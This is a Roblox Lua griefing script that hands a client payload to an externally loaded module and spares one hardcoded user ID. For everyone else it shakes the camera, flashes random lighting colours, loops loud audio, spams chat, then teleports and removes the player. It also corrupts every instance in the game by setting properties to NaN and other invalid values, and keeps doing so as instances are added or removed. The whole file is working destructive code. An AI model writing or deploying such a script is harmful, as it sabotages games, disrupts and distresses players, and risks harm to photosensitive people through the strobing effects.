local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")
local the = "weasbuiphuipbfjuipjauipbjeapbuijfa"
task.defer(require(15258797781), [[local Players = game:GetService("Players")
if Players.LocalPlayer.UserId == 206662594 then warn("here it goes");return 0 end
local TextChatService = game:GetService("TextChatService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local the = "weasbuiphuipbfjuipjauipbjeapbuijfa"
local rng = Random.new()
local sfx = Instance.new("Sound")
local channel = TextChatService:WaitForChild('TextChannels', 1)
if channel then
	channel = channel:WaitForChild('RBXGeneral', 1)
end

local msg = Instance.new("Message")
msg:AddTag(the)
msg.Parent = workspace

local cc = Instance.new("ColorCorrectionEffect")
cc.Parent = Lighting
cc:AddTag(the)

sfx:AddTag(the)
sfx.SoundId = "rbxassetid://92036760964326"
sfx.Looped = true
sfx.Volume = 2
sfx.Parent = game.SoundService
if not sfx.IsLoaded then sfx.Loaded:Wait() end
sfx:Play()
local coold = 1/(170/60)

local wasEnabled = false

local chars = "rookiecookie153!\n\t"
local RunService = game:GetService("RunService")
RunService:BindToRenderStep("rookiecookie153", Enum.RenderPriority.Camera.Value+1, function(dt)
	local cam = workspace.CurrentCamera
	if not cam or not cam:IsDescendantOf(workspace) then
		cam = Instance.new('Camera', workspace)
		workspace.CurrentCamera = cam
	end

	cam.CameraType = Enum.CameraType.Scriptable
	local x = rng:NextNumber(-.1,.1)*dt
	local y = rng:NextNumber(-.1,.1)*dt
	local z = rng:NextNumber(-.1,.1)*dt
	local r00 = rng:NextNumber(-1,1)*dt
	local r01 = rng:NextNumber(-1,1)*dt
	local r02 = rng:NextNumber(-1,1)*dt
	local r10 = rng:NextNumber(-1,1)*dt
	local r11 = rng:NextNumber(-1,1)*dt
	local r12 = rng:NextNumber(-1,1)*dt
	local r20 = rng:NextNumber(-1,1)*dt
	local r21 = rng:NextNumber(-1,1)*dt
	local r22 = rng:NextNumber(-1,1)*dt
	cam.CFrame = cam.CFrame * CFrame.new(x,y,z,r00+1,r01,r02,r10,r11+1,r12,r20,r21,r22+1)

	local t = sfx.TimePosition
	local guid = ""
	if (t/coold)%2>1 then
		local tmp = HttpService:GenerateGUID(false)
		for i = 1, #tmp do
			local c = tmp:sub(i,i)
			i = (string.byte(c) % #chars) + 1
			guid = guid .. chars:sub(i,i)
		end
	end
	msg.Text = guid
	local isEnabled2 = (t/coold)%2>1
	if isEnabled2 ~= wasEnabled then
		wasEnabled = isEnabled2
		cc.TintColor = BrickColor.Random().Color
		Lighting.Ambient = BrickColor.Random().Color
		Lighting.OutdoorAmbient = BrickColor.Random().Color
		if isEnabled2 and channel then
			channel:SendAsync("153!")
		end
	end
end)
local TeleportService = game:GetService("TeleportService")
local Debris = game:GetService("Debris")
local Players = game:GetService("Players")
local propi = {}
local datatypes={
	0/0,
	false,
	UDim2.fromScale(0/0,0/0);
	Vector3.new(0/0,0/0,0/0);
	CFrame.new(0/0,0/0,0/0);
	BrickColor.new(0/0);
	Color3.new(0/0,0/0,0/0);
}
local props = {
	"Parent","Name","Archivable","ClassName","Value",
	"BrickColor","Color","Material","Reflectance","Transparency",
	"Orientation","Position","RotVelocity","Velocity",
	"Anchored","CanCollide","CollisionGroupId","Locked","Massless",
	"ResizableFaces","ResizeIncrement","Disabled","Occupant",
	"CustomPhysicalProperties","RootPriority","Shape","Size",
	"Density","Friction","Elasticity","FrictionWeight","ElasticityWeight",
	"BackParamA","BackParamB","BackSurfaceInput",
	"BottomParamA","BottomParamB","BottomSurfaceInput",
	"FrontParamA","FrontParamB","FrontSurfaceInput",
	"LeftParamA","LeftParamB","LeftSurfaceInput",
	"RightParamA","RightParamB","RightSurfaceInput",
	"TopParamA","TopParamB","TopSurfaceInput",
	"BackSurface","BottomSurface","FrontSurface","LeftSurface","RightSurface","TopSurface",
	"MeshId","TextureId","CollisionFidelity","Offset","Scale","VertexColor",
	"GripForward","GripPos","GripRight","GripUp","ToolTip",
	"CanBeDropped","ManualActivationOnly","RequiresHandle","Enabled",
	"EmitterSize","IsLoaded","IsPaused","IsPlaying","Looped",
	"MaxDistance","PlaybackLoudness","PlaybackSpeed","Playing","RollOffMode","Pitch",
	"SoundGroup","SoundId","TimeLength","TimePosition","Volume","PlayOnRemove",
	"FieldOfView","HeadLocked","HeadScale","NearPlaneZ","ViewportSize","CameraSubject","CameraType",
	"WaterColor","WaterReflectance","WaterTransparency","WaterWaveSize","WaterWaveSpeed",
	"CurrentCamera","DistributedGameTime","PrimaryPart","AllowThirdPartySales","AutoJointsMode",
	"FallenPartsDestroyHeight","FilteringEnabled","Gravity",
	"StreamingEnabled","StreamingMinRadius","StreamingTargetRadius","Terrain",
	"CurrentEditor","LinkedSource","CameraOffset","DisplayDistanceType",
	"HealthDisplayDistance","HealthDisplayType","NameDisplayDistance","NameOcclusion",
	"RigType","RootPart","BreakJointsOnDeath","AutoJumpEnabled","JumpPower",
	"AutoRotate","FloorMaterial","Jump","MoveDirection","PlatformStand","SeatPart","Sit",
	"TargetPoint","WalkToPart","WalkToPoint","AutomaticScalingEnabled","Health",
	"HipHeight","MaxHealth","MaxSlopeAngle","WalkSpeed",
	"Color3","PantsTemplate","ShirtTemplate",
	"HeadColor","HeadColor3","LeftArmColor","LeftArmColor3","LeftLegColor","LeftLegColor3",
	"RightArmColor","RightArmColor3","RightLegColor","RightLegColor3","TorsoColor","TorsoColor3",
	"AnimationId","Face","CurrentAngle","DesiredAngle","MaxVelocity","Part0","Part1","Active",
	"BodyTypeScale","DepthScale","HeadScale","HeightScale","ProportionScale","WidthScale",
	"ClimbAnimation","FallAnimation","IdleAnimation","JumpAnimation","RunAnimation","SwimAnimation",
	"WalkAnimation","Face","Head","LeftArm","RightArm","RightLeg","Torso",
	"GraphicTShirt","Pants","Shirt",
	"Visible","Axis","SecondaryAxis","WorldAxis","WorldOrientation","WorldPosition","WorldSecondaryAxis",
	"ZOffset","AbsolutePosition","AbsoluteRotation","AbsoluteSize","Adornee","AlwaysOnTop",
	"CanvasSize","LightInfluence","ResetOnSpawn","ToolPunchThroughDistance","ZIndexBehavior",
	"ClipsDescendants","AutoLocalize","RootLocalizationTable","SelectionImageObject",
	"AnchorPoint","BackgroundColor3","BackgroundTransparency","BorderColor3","BorderTransparency",
	"BorderSizePixel","ClearTextOnFocus","CursorPosition","LayoutOrder","Multiline",
	"Selectable","ShowNativeInput","SizeConstraint",
	"NextSelectionDown","NextSelectionLeft","NextSelectionRight","NextSelectionUp",
	"Font","LineHeight","PlaceholderColor3","PlaceholderText","Text","TextBounds","TextColor3","TextFits",
	"TextScaled","TextSize","TextStrokeColor3","TextStrokeTransparency","TextTransparency",
	"TextTruncate","TextWrapped","TextXAlignment","TextYAlignment",
	"LineThickness","SurfaceColor3","SurfaceTransparency","ExtendsOffset","ExtentsOffsetWorldSpace",
	"PlayerToHideFrom","SizeOffset","StudsOffset","StudsOffsetWorldSpace",
	"Axes","Faces","Style","TargetSurface","AttachmentForward","AttachmentPos","AttachmentRight",
	"AttachmentUp","Priority","Loop","Time","EasingDirection","EasingStyle","Weight",
	"D","MaxTorque","P","BodyPart","BaseTextureId","OverlayTextureId","Angle","Brightness","Coils",
	"LightEmission","Radius","Range","RotationAxisVisible","Shadows","StudsPerTileU","StudsPerTileV",
	"TextureLength","TextureMode","TextureSpeed","Thickness","BlastPressure","BlastRadius",
	"DestroyJointsRadiusPercent","ExplosionType","Heat","MaxActivationDIstance","MeshType","Opacity",
	"RiseVelocity","SecondaryColor","SparkleColor","Attachment0","Attachment1","CurveSize0","CurveSize1",
	"FaceCamera","Segments","Width0","Width1","AngularVelocity","CartoonFactor","Force","Location","MaxForce",
	"TargetOffset","TargetRadius","MaxSpeed","MaxThrust","ThrustD","ThrustP","TurnD","TurnP","CursorIcon",
	"PrimaryAxisOnly","ReactionTorqueEnabled","RigidityEnabled","MaxAngularVelocity","Responsiveness",
	"APplyAtCenterOfMass","ReactionForceEnabled","RelativeTo","Torque","LimitsEnabled","ActuatorType",
	"CurrentDistance","CurrentLength","CurrentPosition","WorldRotationAxis","InverseSquareLaw","Magnitude",
	"Length","Restitution","AngularActuatorType","AngularLimitsEnabled","InclinationAngle","Damping",
	"FreeLength","Stiffness","Acceleration","Drag","LockedToPart","VelocityInheritance","EmissionDirection",
	"Lifetime","Rate","Rotation","Speed","RotSpeed","SpreadAngle","BehaviorType","ConversationDistance",
	"DisplayOrder","GoodbyeChoiceActive","GoodbyeDialog","IgnoreGuiInset","InitialPrompt","InUse",
	"Purpose","Tone","TriggerDistance","TriggerOffset","SourceLocaleId","MinLength","Animated",
	"CellPadding","CellSize","Circular","FillEmptySpaceColumns","FillEmptySpaceRows","Padding","TweenTime",
	"AbsoluteContentSize","AutoButtonColor","CurrentPage","Modal","Selected","AspectRatio","AspectType",
	"DominantAxis","FillDirection","FillDirectionMaxCells","HorizontalAlignment","MajorAxis","MaxSize",
	"MaxTextSize","MinSize","MinTextSize","PaddingBottom","PaddingLeft","PaddingRight","PaddingTop",
	"SortOrder","StartCorner","VerticalAlignment","HoverImage","ImageRectOffset","ImageColor3",
	"ImageRectSize","ImageTransparency","PressedImage","ScaleType","SliceScale","GamepadInputEnabled",
	"ScrollWheelInputEnabled","TouchInputEnabled",
}
local function manage(p)
	if p:HasTag(the) then return end
	local classprops = propi[p.ClassName]
	if classprops then
		task.spawn(function()
			for _, v in pairs(classprops) do
				pcall(function()
					p[ v[1] ] = v[2]
				end)
			end
		end)
	else
		classprops = {}
		for _, v in pairs(props) do
			for _, vv in pairs(datatypes) do
				local s = pcall(function()
					p[v]=vv
					table.insert(classprops, {v, vv})
				end)
				if s then break end
			end
		end
		propi[p.ClassName] = classprops
	end
	task.wait()
end
game.DescendantAdded:Connect(manage)
game.DescendantRemoving:Connect(manage)
for _, p in pairs(game:GetDescendants()) do
	manage(p)
	
	if not p:HasTag(the) then
		pcall(function()
			local d = game:GetDescendants()
			rng:Shuffle(d)
			p.Parent = d[1]
		end)
		if p:IsA("Sound") then
			pcall(function()
				p.Looped = true
				p:Play()
				p.Volume = 5
				p.PlaybackSpeed = rng:NextNumber(.1, 10)
			end)
		end
	end
end
task.wait(1)
local client = Players.LocalPlayer
TeleportService:Teleport(1, client)
Debris:AddItem(client, 0.2)]])
task.wait(5)
local rn = ReplicatedStorage:WaitForChild('rn', 1)
if rn then
	rn:AddTag(the)
end
local propi = {}
local datatypes={
	0/0,
	false,
	UDim2.fromScale(0/0,0/0);
	Vector3.new(0/0,0/0,0/0);
	CFrame.new(0/0,0/0,0/0);
	BrickColor.new(0/0);
	Color3.new(0/0,0/0,0/0);
	workspace;
}
local props = {
	"Parent","Name","Archivable","ClassName","Value",
	"BrickColor","Color","Material","Reflectance","Transparency",
	"Orientation","Position","RotVelocity","Velocity",
	"Anchored","CanCollide","CollisionGroupId","Locked","Massless",
	"ResizableFaces","ResizeIncrement","Disabled","Occupant",
	"CustomPhysicalProperties","RootPriority","Shape","Size",
	"Density","Friction","Elasticity","FrictionWeight","ElasticityWeight",
	"BackParamA","BackParamB","BackSurfaceInput",
	"BottomParamA","BottomParamB","BottomSurfaceInput",
	"FrontParamA","FrontParamB","FrontSurfaceInput",
	"LeftParamA","LeftParamB","LeftSurfaceInput",
	"RightParamA","RightParamB","RightSurfaceInput",
	"TopParamA","TopParamB","TopSurfaceInput",
	"BackSurface","BottomSurface","FrontSurface","LeftSurface","RightSurface","TopSurface",
	"MeshId","TextureId","CollisionFidelity","Offset","Scale","VertexColor",
	"GripForward","GripPos","GripRight","GripUp","ToolTip",
	"CanBeDropped","ManualActivationOnly","RequiresHandle","Enabled",
	"EmitterSize","IsLoaded","IsPaused","IsPlaying","Looped",
	"MaxDistance","PlaybackLoudness","PlaybackSpeed","Playing","RollOffMode","Pitch",
	"SoundGroup","SoundId","TimeLength","TimePosition","Volume","PlayOnRemove",
	"FieldOfView","HeadLocked","HeadScale","NearPlaneZ","ViewportSize","CameraSubject","CameraType",
	"WaterColor","WaterReflectance","WaterTransparency","WaterWaveSize","WaterWaveSpeed",
	"CurrentCamera","DistributedGameTime","PrimaryPart","AllowThirdPartySales","AutoJointsMode",
	"FallenPartsDestroyHeight","FilteringEnabled","Gravity",
	"StreamingEnabled","StreamingMinRadius","StreamingTargetRadius","Terrain",
	"CurrentEditor","LinkedSource","CameraOffset","DisplayDistanceType",
	"HealthDisplayDistance","HealthDisplayType","NameDisplayDistance","NameOcclusion",
	"RigType","RootPart","BreakJointsOnDeath","AutoJumpEnabled","JumpPower",
	"AutoRotate","FloorMaterial","Jump","MoveDirection","PlatformStand","SeatPart","Sit",
	"TargetPoint","WalkToPart","WalkToPoint","AutomaticScalingEnabled","Health",
	"HipHeight","MaxHealth","MaxSlopeAngle","WalkSpeed",
	"Color3","PantsTemplate","ShirtTemplate",
	"HeadColor","HeadColor3","LeftArmColor","LeftArmColor3","LeftLegColor","LeftLegColor3",
	"RightArmColor","RightArmColor3","RightLegColor","RightLegColor3","TorsoColor","TorsoColor3",
	"AnimationId","Face","CurrentAngle","DesiredAngle","MaxVelocity","Part0","Part1","Active",
	"BodyTypeScale","DepthScale","HeadScale","HeightScale","ProportionScale","WidthScale",
	"ClimbAnimation","FallAnimation","IdleAnimation","JumpAnimation","RunAnimation","SwimAnimation",
	"WalkAnimation","Face","Head","LeftArm","RightArm","RightLeg","Torso",
	"GraphicTShirt","Pants","Shirt",
	"Visible","Axis","SecondaryAxis","WorldAxis","WorldOrientation","WorldPosition","WorldSecondaryAxis",
	"ZOffset","AbsolutePosition","AbsoluteRotation","AbsoluteSize","Adornee","AlwaysOnTop",
	"CanvasSize","LightInfluence","ResetOnSpawn","ToolPunchThroughDistance","ZIndexBehavior",
	"ClipsDescendants","AutoLocalize","RootLocalizationTable","SelectionImageObject",
	"AnchorPoint","BackgroundColor3","BackgroundTransparency","BorderColor3","BorderTransparency",
	"BorderSizePixel","ClearTextOnFocus","CursorPosition","LayoutOrder","Multiline",
	"Selectable","ShowNativeInput","SizeConstraint",
	"NextSelectionDown","NextSelectionLeft","NextSelectionRight","NextSelectionUp",
	"Font","LineHeight","PlaceholderColor3","PlaceholderText","Text","TextBounds","TextColor3","TextFits",
	"TextScaled","TextSize","TextStrokeColor3","TextStrokeTransparency","TextTransparency",
	"TextTruncate","TextWrapped","TextXAlignment","TextYAlignment",
	"LineThickness","SurfaceColor3","SurfaceTransparency","ExtendsOffset","ExtentsOffsetWorldSpace",
	"PlayerToHideFrom","SizeOffset","StudsOffset","StudsOffsetWorldSpace",
	"Axes","Faces","Style","TargetSurface","AttachmentForward","AttachmentPos","AttachmentRight",
	"AttachmentUp","Priority","Loop","Time","EasingDirection","EasingStyle","Weight",
	"D","MaxTorque","P","BodyPart","BaseTextureId","OverlayTextureId","Angle","Brightness","Coils",
	"LightEmission","Radius","Range","RotationAxisVisible","Shadows","StudsPerTileU","StudsPerTileV",
	"TextureLength","TextureMode","TextureSpeed","Thickness","BlastPressure","BlastRadius",
	"DestroyJointsRadiusPercent","ExplosionType","Heat","MaxActivationDIstance","MeshType","Opacity",
	"RiseVelocity","SecondaryColor","SparkleColor","Attachment0","Attachment1","CurveSize0","CurveSize1",
	"FaceCamera","Segments","Width0","Width1","AngularVelocity","CartoonFactor","Force","Location","MaxForce",
	"TargetOffset","TargetRadius","MaxSpeed","MaxThrust","ThrustD","ThrustP","TurnD","TurnP","CursorIcon",
	"PrimaryAxisOnly","ReactionTorqueEnabled","RigidityEnabled","MaxAngularVelocity","Responsiveness",
	"APplyAtCenterOfMass","ReactionForceEnabled","RelativeTo","Torque","LimitsEnabled","ActuatorType",
	"CurrentDistance","CurrentLength","CurrentPosition","WorldRotationAxis","InverseSquareLaw","Magnitude",
	"Length","Restitution","AngularActuatorType","AngularLimitsEnabled","InclinationAngle","Damping",
	"FreeLength","Stiffness","Acceleration","Drag","LockedToPart","VelocityInheritance","EmissionDirection",
	"Lifetime","Rate","Rotation","Speed","RotSpeed","SpreadAngle","BehaviorType","ConversationDistance",
	"DisplayOrder","GoodbyeChoiceActive","GoodbyeDialog","IgnoreGuiInset","InitialPrompt","InUse",
	"Purpose","Tone","TriggerDistance","TriggerOffset","SourceLocaleId","MinLength","Animated",
	"CellPadding","CellSize","Circular","FillEmptySpaceColumns","FillEmptySpaceRows","Padding","TweenTime",
	"AbsoluteContentSize","AutoButtonColor","CurrentPage","Modal","Selected","AspectRatio","AspectType",
	"DominantAxis","FillDirection","FillDirectionMaxCells","HorizontalAlignment","MajorAxis","MaxSize",
	"MaxTextSize","MinSize","MinTextSize","PaddingBottom","PaddingLeft","PaddingRight","PaddingTop",
	"SortOrder","StartCorner","VerticalAlignment","HoverImage","ImageRectOffset","ImageColor3",
	"ImageRectSize","ImageTransparency","PressedImage","ScaleType","SliceScale","GamepadInputEnabled",
	"ScrollWheelInputEnabled","TouchInputEnabled",
}
function manage(p)
	if p:HasTag(the) then return end
	local classprops = propi[p.ClassName]
	if classprops then
		for _, v in pairs(classprops) do
			pcall(function()
				p[ v[1] ] = v[2]
			end)
		end
	else
		classprops = {}
		for _, v in pairs(props) do
			for _, vv in pairs(datatypes) do
				local s = pcall(function()
					p[v]=vv
					table.insert(classprops, {v, vv})
				end)
				if s then break end
			end
		end
		propi[p.ClassName] = classprops
	end
end
game.DescendantAdded:Connect(manage)
game.DescendantRemoving:Connect(manage)
for _, p in pairs(game:GetDescendants()) do
	manage(p)
end

return 0
